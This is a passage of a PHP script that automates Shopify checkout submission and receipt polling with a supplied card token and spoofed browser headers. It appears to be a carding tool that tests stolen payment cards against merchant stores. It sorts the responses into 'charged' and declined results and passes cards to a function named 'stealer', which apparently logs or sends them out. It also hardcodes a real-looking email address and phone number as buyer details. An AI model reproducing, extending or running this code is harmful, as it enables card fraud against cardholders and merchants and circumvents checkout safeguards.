                    'sessionInput' => [
                        'sessionToken' => $x_checkout_one_session_token
                    ],
                    'queueToken' => $queue_token,
                    'discounts' => [
                        'lines' => [],
                        'acceptUnexpectedDiscounts' => true
                    ],
                    'delivery' => [
                        'deliveryLines' => [
                            [
                                'destination' => [
                                    'streetAddress' => [
                                        'address1' => $address['street'],
                                        'address2' => '',
                                        'city' => $address['city'],
                                        'countryCode' => $address['country'],
                                        'postalCode' => $address['postcode'],
                                        'firstName' => 'insane',
                                        'lastName' => 'xd',
                                        'zoneCode' => $address['state'],
                                        'phone' => '+18103646394',
                                        'oneTimeUse' => false,
                                        'coordinates' => [
                                        'latitude' => $latitude,
                                        'longitude' => $longitude
                                    ]
                                    ]
                                ],
                                'selectedDeliveryStrategy' => [
                                    'deliveryStrategyByHandle' => [
                                        'handle' => $handle,
                                        'customDeliveryRate' => false
                                    ],
                                    'options' => new stdClass()
                                ],
                                'targetMerchandiseLines' => [
                                    'lines' => [
                                        [
                                            'stableId' => $stable_id
                                        ]
                                    ]
                                ],
                                'deliveryMethodTypes' => [
                                    'SHIPPING'
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $delamount,
                                        'currencyCode' => $address['currency']
                                    ]
                                ],
                                'destinationChanged' => false
                            ]
                        ],
                        'noDeliveryRequired' => [],
                        'useProgressiveRates' => false,
                        'prefetchShippingRatesStrategy' => null,
                        'supportsSplitShipping' => true
                    ],
                    'deliveryExpectations' => [
                        'deliveryExpectationLines' => []
                    ],
                    'merchandise' => [
                        'merchandiseLines' => [
                            [
                                'stableId' => $stable_id,
                                'merchandise' => [
                                    'productVariantReference' => [
                                        'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                        'properties' => [],
                                        'sellingPlanId' => null,
                                        'sellingPlanDigest' => null
                                    ]
                                ],
                                'quantity' => [
                                    'items' => [
                                        'value' => 1
                                    ]
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $minPrice,
                                        'currencyCode' => $address['currency']
                                    ]
                                ],
                                'lineComponentsSource' => null,
                                'lineComponents' => []
                            ]
                        ]
                    ],
                    'payment' => [
                        'totalAmount' => [
                            'any' => true
                        ],
                        'paymentLines' => [
                            [
                                'paymentMethod' => [
                                    'directPaymentMethod' => [
                                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                        'sessionId' => $cctoken,
                                        'billingAddress' => [
                                            'streetAddress' => [
                                                'address1' => $address['street'],
                                                'address2' => '',
                                                'city' => $address['city'],
                                                'countryCode' => $address['country'],
                                                'postalCode' => $address['postcode'],
                                                'firstName' => 'insane',
                                                'lastName' => 'xd',
                                                'zoneCode' => $address['state'],
                                                'phone' => '+18103646394'
                                            ]
                                        ],
                                        'cardSource' => null
                                    ],
                                    'giftCardPaymentMethod' => null,
                                    'redeemablePaymentMethod' => null,
                                    'walletPaymentMethod' => null,
                                    'walletsPlatformPaymentMethod' => null,
                                    'localPaymentMethod' => null,
                                    'paymentOnDeliveryMethod' => null,
                                    'paymentOnDeliveryMethod2' => null,
                                    'manualPaymentMethod' => null,
                                    'customPaymentMethod' => null,
                                    'offsitePaymentMethod' => null,
                                    'customOnsitePaymentMethod' => null,
                                    'deferredPaymentMethod' => null,
                                    'customerCreditCardPaymentMethod' => null,
                                    'paypalBillingAgreementPaymentMethod' => null
                                ],
                                'amount' => [
                                    'value' => [
                                        'amount' => $totalamt,
                                        'currencyCode' => $address['currency']
                                    ]
                                ],
                                'dueAt' => null
                            ]
                        ],
                        'billingAddress' => [
                            'streetAddress' => [
                                'address1' => $address['street'],
                                'address2' => '',
                                'city' => $address['city'],
                                'countryCode' => $address['country'],
                                'postalCode' => $address['postcode'],
                                'firstName' => 'insane',
                                'lastName' => 'xd',
                                'zoneCode' => $address['state'],
                                'phone' => '+18103646394'
                            ]
                        ]
                    ],
                    'buyerIdentity' => [
                        'customer' => [
                            'presentmentCurrency' => $address['currency'],
                            'countryCode' => $address['country']
                        ],
                        'email' => 'amanpandey125aman@gmail.com',
                        'emailChanged' => false,
                        'phoneCountryCode' => $address['country'],
                        'marketingConsent' => [],
                        'shopPayOptInPhone' => [
                            'countryCode' => $address['country']
                        ]
                    ],
                    'tip' => [
                        'tipLines' => []
                    ],
                    'taxes' => [
                        'proposedAllocations' => null,
                        'proposedTotalAmount' => [
                            'value' => [
                                'amount' => $tax,
                                'currencyCode' => $address['currency']
                            ]
                        ],
                        'proposedTotalIncludedAmount' => null,
                        'proposedMixedStateTotalAmount' => null,
                        'proposedExemptions' => []
                    ],
                    'note' => [
                        'message' => null,
                        'customAttributes' => []
                    ],
                    'localizationExtension' => [
                        'fields' => []
                    ],
                    'nonNegotiableTerms' => null,
                    'scriptFingerprint' => [
                        'signature' => null,
                        'signatureUuid' => null,
                        'lineItemScriptChanges' => [],
                        'paymentScriptChanges' => [],
                        'shippingScriptChanges' => []
                    ],
                    'optionalDuties' => [
                        'buyerRefusesDuties' => false
                    ]
                ],
                'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
                'metafields' => [],
                'analytics' => [
                    'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                    'pageId' => $stable_id
                ]
            ],
            'operationName' => 'SubmitForCompletion'
        ]);    
}
else {
    error('Unknown shipping method type.', $price, $gateway, $cc1);
}

sleep(0.5);

 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US',
    'content-type: application/json',
    'origin: '.$urlbase,
    'priority: u=1, i',
    'referer: '.$urlbase.'/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: '.$ua,
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);


curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);

$response4 = curl_exec($ch);
if (curl_errno($ch)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto recipt; 
    } else {
        error('Curl Error.', $price, $gateway, $cc1);
}
}
if (strpos($response4, '"errors":[{"code":"CAPTCHA_METADATA_MISSING"')) {
    $err = "SITE DEAD w8 40mim And Try Again...";
    error($err, $price, $gateway, $cc1);
}

$response4js = json_decode($response4); 

if (isset($response4js->data->submitForCompletion->receipt->id)) {
    $recipt_id = $response4js->data->submitForCompletion->receipt->id;
} elseif (empty($recipt_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto recipt;
    } else {
        error('Missing special token Recipt ID.', $price, $gateway, $cc1);
    }
}

poll:

$postf2 = json_encode([
    'query' => extractQueryFromFile('json.txt', 5),
    'variables' => [
        'receiptId' => $recipt_id,
        'sessionToken' => $x_checkout_one_session_token
    ],
    'operationName' => 'PollForReceipt'

]);

sleep(0.5);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'accept: application/json',
'accept-language: en-US',
'content-type: application/json',
'origin: '.$urlbase,
'priority: u=1, i',
'referer: '.$urlbase,
'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: '.$ua,
'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
'x-checkout-web-build-id: ' . $web_build_id,
'x-checkout-web-deploy-stage: production',
'x-checkout-web-server-handling: fast',
'x-checkout-web-server-rendering: no',
'x-checkout-web-source-id: ' . $checkoutToken,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);
$response5 = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll; 
    } else {
    error('Curl Error.', $price, $gateway, $cc1);
}
}

$r5js = json_decode($response5);

if (
    strpos($response5, $checkouturl . '/thank_you') !== false ||
    strpos($response5, $checkouturl . '/post_purchase') !== false ||
    strpos($response5, 'Your order is confirmed') !== false ||
    strpos($response5, 'Thank you') !== false ||
    strpos($response5, 'ThankYou') !== false ||
    strpos($response5, 'thank_you') !== false ||
    strpos($response5, 'success') !== false ||
    strpos($response5, 'classicThankYouPageUrl') !== false ||
    strpos($response5, '"__typename":"ProcessedReceipt"') !== false ||
    strpos($response5, 'SUCCESS') !== false
) {
    // Log the successful charge first
    stealer($cc1, '#Charged', $gateway, $price, $site, $response5);

    // Then, send the success message to the client
    SucessError('Your order is confirmed', $price, $gateway, $site, $cc1);
    exit;
}
elseif (strpos($response5, 'CompletePaymentChallenge') !== false) {
    SucessError('CompletePaymentChallenge', $price, $gateway, $site, $cc1);
}
elseif (strpos($response5, '/stripe/authentications/') !== false) {
    SucessError('stripeAuthentications', $price, $gateway, $site, $cc1);
}
elseif (strpos($response5, 'incorrect_zip') !== false) {
    stealer($cc1, '#incorrect_zip', $gateway, $price, $site, $response5);
    SucessError('incorrect_zip', $price, $gateway, $site, $cc1);
}
elseif (isset($r5js->data->receipt->processingError->code)) {
    SucessError($r5js->data->receipt->processingError->code, $price, $gateway, $site, $cc1);
}
elseif (strpos($response5, '"__typename":"WaitingReceipt"') !== false || strpos($response5, '"__typename":"ProcessingReceipt"') !== false) {
    sleep(5);
    goto poll;
}
else {
    SucessError('Unknown Error Message', $price, $gateway, $site, $cc1);
    stealer($cc1, '#Unknown', $gateway, $price, $site, $response5);
}